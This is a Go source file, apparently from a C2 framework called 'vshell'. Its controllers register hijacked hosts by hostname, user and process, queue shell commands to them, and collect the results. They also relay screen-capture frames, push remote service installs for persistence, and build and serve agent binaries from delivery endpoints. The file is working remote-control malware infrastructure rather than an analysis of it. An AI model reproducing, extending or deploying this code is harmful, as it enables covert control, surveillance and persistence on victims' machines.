package controllers

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"vshell/c2engine"
	"vshell/models"
)

// C2Engine 管理 C2 客户端通信与命令派发。
// C2Engine manages C2 client communication and command dispatch.
// (updated to use the c2engine package)
type C2Engine struct {
	mu               sync.RWMutex
	activeClients    map[int64]*ClientSession
	listenerServers  map[int64]*http.Server
}

// ClientSession 跟踪一个已连接的 Agent。
// ClientSession tracks a connected agent.
type ClientSession struct {
	ClientID    int64      `json:"client_id"`
	VerifyKey   string     `json:"verify_key"`
	RemoteAddr  string     `json:"remote_addr"`
	LastSeen    time.Time  `json:"last_seen"`
	InitialData *ClientInfo `json:"initial_data,omitempty"`
}

// ClientInfo 保存 Agent 初始注册数据。
// ClientInfo holds the initial registration data.
type ClientInfo struct {
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	Pid         int    `json:"pid,omitempty"`
}

var c2 = &C2Engine{
	activeClients:   make(map[int64]*ClientSession),
	listenerServers: make(map[int64]*http.Server),
}

// RegisterC2Routes 将 C2 API 端点注册到 HTTP mux。
// RegisterC2Routes adds C2 API endpoints to the HTTP mux.
func RegisterC2Routes(mux *http.ServeMux, basePath string, listenerID int64, verifyKey string) {
	prefix := fmt.Sprintf("%s/l/%d", basePath, listenerID)
	mux.HandleFunc(prefix+"/checkin", c2.handleCheckin(listenerID, verifyKey))
	mux.HandleFunc(prefix+"/tasks", c2.handleTasks(listenerID))
	mux.HandleFunc(prefix+"/result", c2.handleResult(listenerID))
	log.Printf("[C2] Registered routes at %s for listener %d", prefix, listenerID)
}

// handleCheckin 处理 Agent 签到（注册/心跳）。
// handleCheckin handles agent check-in (registration/heartbeat).
func (e *C2Engine) handleCheckin(listenerID int64, verifyKey string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", 405)
			return
		}

		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "bad request", 400)
			return
		}
		r.Body.Close()

		var info ClientInfo
		if err := json.Unmarshal(body, &info); err != nil {
			http.Error(w, "bad request", 400)
			return
		}

		// Use c2engine for client management
		engine := c2engine.GetEngine()

		// Check if client exists by verify key
		if existingID, ok := engine.GetIdByVerifyKey(verifyKey); ok {
			// Update existing client
			client := engine.GetClient(existingID)
			if client != nil {
				client.UpdateSeen()
				client.Addr = r.RemoteAddr
				client.AddConn()

				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]interface{}{
					"status":     "ok",
					"client_id":  client.ID,
					"session_id": fmt.Sprintf("sess_%d_%d", listenerID, time.Now().UnixNano()),
					"interval":   5,
					"timeout":    30,
				})
				return
			}
		}

		// New client
		client, err := engine.NewClient(
			verifyKey,
			"http",
			r.RemoteAddr,
			info.LocalIP,
			info.UserName,
			info.HostName,
			info.OsName,
			info.ProcessName,
		)
		if err != nil {
			log.Printf("[C2] Failed to register client: %v", err)
			http.Error(w, "internal error", 500)
			return
		}

		// Track in memory
		e.mu.Lock()
		e.activeClients[client.ID] = &ClientSession{
			ClientID:    client.ID,
			VerifyKey:   verifyKey,
			RemoteAddr:  r.RemoteAddr,
			LastSeen:    time.Now(),
			InitialData: &info,
		}
		e.mu.Unlock()

		log.Printf("[C2] Client registered: %s@%s (ID: %d)", info.UserName, info.HostName, client.ID)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":     "ok",
			"client_id":  client.ID,
			"session_id": c2engine.GenerateSessionID(listenerID),
			"interval":   5,
			"timeout":    30,
		})
	}
}

// handleTasks 处理 Agent 任务轮询。
// handleTasks handles agent task polling.
func (e *C2Engine) handleTasks(listenerID int64) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		clientIDStr := r.URL.Query().Get("client_id")
		if clientIDStr == "" {
			http.Error(w, "missing client_id", 400)
			return
		}

		var clientID int64
		fmt.Sscanf(clientIDStr, "%d", &clientID)

		// Update last seen
		e.mu.Lock()
		if session, ok := e.activeClients[clientID]; ok {
			session.LastSeen = time.Now()
		}
		e.mu.Unlock()

		// Also update in c2engine
		engine := c2engine.GetEngine()
		if client := engine.GetClient(clientID); client != nil {
			client.UpdateSeen()
		}

		// Query pending tasks from c2engine
		engineTasks := engine.GetPendingTasks(clientID)
		tasks := make([]map[string]interface{}, 0, len(engineTasks))
		for _, t := range engineTasks {
			tasks = append(tasks, map[string]interface{}{
				"id":      t.ID,
				"command": t.Command,
				"timeout": t.Timeout,
			})
			t.Status = "dispatched"
		}

		// Fallback to old DB-based tasks
		db := models.GetDB()
		if db != nil {
			dbCmds, _ := db.GetPendingCommands(clientID)
			for _, cmd := range dbCmds {
				tasks = append(tasks, map[string]interface{}{
					"id":      cmd.ID,
					"command": cmd.Command,
					"timeout": cmd.Timeout,
				})
				db.MarkCommandDispatched(cmd.ID)
			}
		}

		if tasks == nil {
			tasks = []map[string]interface{}{}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"tasks":    tasks,
			"interval": 5,
		})
	}
}

// handleResult 处理 Agent 任务结果回传。
// handleResult handles agent task result submission.
func (e *C2Engine) handleResult(listenerID int64) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", 405)
			return
		}

		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "bad request", 400)
			return
		}
		r.Body.Close()

		var result struct {
			ClientID  int64  `json:"client_id"`
			CommandID int64  `json:"command_id"`
			Result    string `json:"result"`
			Status    string `json:"status"`
		}

		if err := json.Unmarshal(body, &result); err != nil {
			http.Error(w, "bad request", 400)
			return
		}

		status := result.Status
		if status == "" {
			status = "completed"
		}

		// Update in c2engine
		engine := c2engine.GetEngine()
		if err := engine.UpdateTask(result.CommandID, result.Result, status); err != nil {
			log.Printf("[C2] Failed to update c2engine task %d: %v", result.CommandID, err)
		}

		// Also update in old DB
		if db := models.GetDB(); db != nil {
			if err := db.CompleteCommand(result.CommandID, result.Result, status); err != nil {
				log.Printf("[C2] Failed to store result for cmd %d: %v", result.CommandID, err)
			} else {
				log.Printf("[C2] Command %d completed by client %d: %s", result.CommandID, result.ClientID, status)
			}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":   "ok",
			"received": true,
		})
	}
}

// DispatchCommand 通过 c2engine 向客户端发送命令。
// DispatchCommand sends a command to a client via c2engine.
func DispatchCommand(clientID int64, command string, timeout int) (int64, error) {
	engine := c2engine.GetEngine()

	task, err := engine.CreateTask(clientID, command, timeout)
	if err != nil {
		// Fallback to old DB
		db := models.GetDB()
		if db == nil {
			return 0, fmt.Errorf("database not initialized")
		}
		id, err := db.CreateCommand(clientID, command, timeout)
		if err != nil {
			return 0, fmt.Errorf("create command: %w", err)
		}
		log.Printf("[C2] Command %d dispatched to client %d: %s", id, clientID, command)
		return id, nil
	}

	log.Printf("[C2] Command %d dispatched to client %d: %s", task.ID, clientID, command)
	return task.ID, nil
}

// GetActiveClients 返回当前所有活跃的客户端会话。
// GetActiveClients returns all currently active client sessions.
func GetActiveClients() []*ClientSession {
	c2.mu.RLock()
	defer c2.mu.RUnlock()
	result := make([]*ClientSession, 0, len(c2.activeClients))
	for _, s := range c2.activeClients {
		if time.Since(s.LastSeen) < 60*time.Second {
			result = append(result, s)
		}
	}
	return result
}

// IsClientOnline 检查客户端当前是否在线。
// IsClientOnline checks if a client is currently connected.
func IsClientOnline(clientID int64) bool {
	c2.mu.RLock()
	defer c2.mu.RUnlock()
	s, ok := c2.activeClients[clientID]
	if !ok {
		// Check c2engine
		engine := c2engine.GetEngine()
		client := engine.GetClient(clientID)
		if client == nil {
			return false
		}
		return time.Since(client.LastSeen) < 60*time.Second
	}
	return ok && time.Since(s.LastSeen) < 60*time.Second
}

// StartListenerC2 为监听器注册 C2 端点。
// StartListenerC2 registers the C2 endpoints for a listener.
func StartListenerC2(listener *models.Listener) {
	// Register with c2engine
	engine := c2engine.GetEngine()

	c2Listener, err := engine.NewListener(
		listener.ListenAddr,
		listener.ConnectAddr,
		listener.Mode,
		listener.VerifyKey,
		listener.EncryptSalt,
		listener.Remark,
	)
	if err != nil {
		log.Printf("[C2] Failed to create c2engine listener: %v", err)
		return
	}

	// Start the actual C2 listener
	lm := c2engine.GetListenerManager()
	if err := lm.StartListener(c2Listener); err != nil {
		log.Printf("[C2] Failed to start listener %d: %v", listener.ID, err)
		return
	}

	log.Printf("[C2] Listener %d started (%s mode) on %s", listener.ID, listener.Mode, listener.ListenAddr)
}

// ============================================================================
// Exported C2 Route Handlers (called from router)
// ============================================================================

// HandleC2Checkin 处理 /c2/l/{id}/checkin 的 Agent 签到。
// HandleC2Checkin handles agent check-in at /c2/l/{id}/checkin.
func HandleC2Checkin(w http.ResponseWriter, r *http.Request, listenerID int64, verifyKey string) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", 400)
		return
	}
	r.Body.Close()

	var info ClientInfo
	if err := json.Unmarshal(body, &info); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	engine := c2engine.GetEngine()

	// Auto-register or update client
	client, err := engine.NewClient(
		verifyKey,
		"http",
		r.RemoteAddr,
		info.LocalIP,
		info.UserName,
		info.HostName,
		info.OsName,
		info.ProcessName,
	)
	if err != nil {
		http.Error(w, "internal error", 500)
		return
	}

	// Also update in old DB for compatibility
	db := models.GetDB()
	if db != nil {
		mClient := &models.Client{
			IsConnect:   true,
			VerifyKey:   verifyKey,
			Type:        "http",
			Addr:        r.RemoteAddr,
			Status:      true,
			LocalIP:     info.LocalIP,
			UserName:    info.UserName,
			HostName:    info.HostName,
			OsName:      info.OsName,
			ProcessName: info.ProcessName,
			PingCheckTime: time.Now().Unix(),
			NowConn:     1,
		}
		db.CreateClient(mClient)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":     "ok",
		"client_id":  client.ID,
		"session_id": c2engine.GenerateSessionID(listenerID),
		"interval":   5,
		"timeout":    30,
	})
}

// HandleC2Tasks 处理 /c2/l/{id}/tasks 的 Agent 任务轮询。
// HandleC2Tasks handles agent task polling at /c2/l/{id}/tasks.
func HandleC2Tasks(w http.ResponseWriter, r *http.Request, listenerID int64) {
	clientIDStr := r.URL.Query().Get("client_id")
	if clientIDStr == "" {
		http.Error(w, "missing client_id", 400)
		return
	}

	var clientID int64
	fmt.Sscanf(clientIDStr, "%d", &clientID)

	engine := c2engine.GetEngine()
	if client := engine.GetClient(clientID); client != nil {
		client.UpdateSeen()
	}

	// Get pending tasks from c2engine
	pendingTasks := engine.GetPendingTasks(clientID)
	tasks := make([]map[string]interface{}, 0, len(pendingTasks))
	for _, t := range pendingTasks {
		tasks = append(tasks, map[string]interface{}{
			"id":      t.ID,
			"command": t.Command,
			"timeout": t.Timeout,
		})
		t.Status = "dispatched"
	}

	// Also check old DB
	db := models.GetDB()
	if db != nil {
		dbCmds, _ := db.GetPendingCommands(clientID)
		for _, cmd := range dbCmds {
			tasks = append(tasks, map[string]interface{}{
				"id":      cmd.ID,
				"command": cmd.Command,
				"timeout": cmd.Timeout,
			})
			db.MarkCommandDispatched(cmd.ID)
		}
	}

	if tasks == nil {
		tasks = []map[string]interface{}{}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks":    tasks,
		"interval": 5,
	})
}

// HandleC2Result handles agent task result submission at /c2/l/{id}/result
// HandleAgentDelivery 在下发端点（/swt、/sww、/swk、/sws、/swd、/swl、/swld）提供 Agent 二进制。
// HandleAgentDelivery serves agent binaries at the delivery endpoints
// (/swt, /sww, /swk, /sws, /swd, /swl, /swld).
func HandleAgentDelivery(agentType, platform, arch string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		info := c2engine.GetBuildInfo(platform, arch, agentType)
		builder := c2engine.NewAgentBuilder("agent", "agents")
		agent, err := builder.BuildAgent(info, nil)
		if err != nil {
			log.Printf("[AgentDelivery] Build failed for %s/%s/%s: %v", platform, arch, agentType, err)
			http.Error(w, "Agent build failed", 500)
			return
		}

		w.Header().Set("Content-Type", info.MimeType)
		w.Header().Set("Content-Disposition",
			fmt.Sprintf(`attachment; filename="agent_%s_%s%s"`,
				platform, arch, info.Extension))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(agent.Data)))
		w.Write(agent.Data)

		log.Printf("[AgentDelivery] Served %s agent for %s/%s (%d bytes)",
			agentType, platform, arch, len(agent.Data))
	}
}

// HandleC2Result 处理 /c2/l/{id}/result 的 Agent 任务结果回传。
// HandleC2Result handles agent task result submission at /c2/l/{id}/result.
func HandleC2Result(w http.ResponseWriter, r *http.Request, listenerID int64) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", 400)
		return
	}
	r.Body.Close()

	var result struct {
		ClientID  int64  `json:"client_id"`
		CommandID int64  `json:"command_id"`
		Result    string `json:"result"`
		Status    string `json:"status"`
	}

	if err := json.Unmarshal(body, &result); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	status := result.Status
	if status == "" {
		status = "completed"
	}

	engine := c2engine.GetEngine()
	engine.UpdateTask(result.CommandID, result.Result, status)

	// Check for screen capture frames and relay to screen viewers
	if strings.HasPrefix(result.Result, "screen_frame:") {
		handleScreenFrame(result.ClientID, result.Result)
	}

	if db := models.GetDB(); db != nil {
		db.CompleteCommand(result.CommandID, result.Result, status)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":   "ok",
		"received": true,
	})
}

// ============================================================================
// Service Install/Remove — matched to SPA /install/install and /install/remove
// ============================================================================

// HandleServiceInstall 处理 SPA 的 /install/install 端点（服务安装）。
// HandleServiceInstall handles the SPA's /install/install endpoint (service install).
func HandleServiceInstall(w http.ResponseWriter, r *http.Request) {
	clientID := r.FormValue("id")
	serviceName := r.FormValue("name")
	description := r.FormValue("description")

	// Dispatch a service install command to the client
	cid, _ := strconv.ParseInt(clientID, 10, 64)
	engine := c2engine.GetEngine()
	cmd := c2engine.EncodeShellCommand(fmt.Sprintf(
		`service_install name="%s" desc="%s"`, serviceName, description,
	), 60)

	if cid > 0 {
		engine.CreateTask(cid, cmd, 60)
	}

	log.Printf("[ServiceInstall] Dispatched install: client=%s, name=%s", clientID, serviceName)

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result": map[string]interface{}{
			"client_id":   clientID,
			"name":        serviceName,
			"description": description,
			"status":      "dispatched",
		},
	})
}

// HandleServiceRemove 处理 SPA 的 /install/remove 端点（服务卸载）。
// HandleServiceRemove handles the SPA's /install/remove endpoint (service uninstall).
func HandleServiceRemove(w http.ResponseWriter, r *http.Request) {
	clientID := r.FormValue("id")
	serviceName := r.FormValue("name")

	cid, _ := strconv.ParseInt(clientID, 10, 64)
	engine := c2engine.GetEngine()
	cmd := c2engine.EncodeShellCommand(fmt.Sprintf(`service_remove name="%s"`, serviceName), 30)

	if cid > 0 {
		engine.CreateTask(cid, cmd, 30)
	}

	log.Printf("[ServiceInstall] Dispatched remove: client=%s, name=%s", clientID, serviceName)

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result": map[string]interface{}{
			"client_id": clientID,
			"status":    "dispatched",
		},
	})
}

// handleScreenFrame parses and relays a screen capture frame from agent to viewer
func handleScreenFrame(clientID int64, frameStr string) {
	// Format: "screen_frame:<format>:<index>:<base64_data>"
	parts := strings.SplitN(frameStr, ":", 4)
	if len(parts) < 4 {
		return
	}

	format := parts[1]
	indexStr := parts[2]
	encodedData := parts[3]

	var index int64
	fmt.Sscanf(indexStr, "%d", &index)

	frameData, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		log.Printf("[Screen %d] Failed to decode frame data: %v", clientID, err)
		return
	}

	RelayScreenFrame(clientID, frameData, format, index)
}
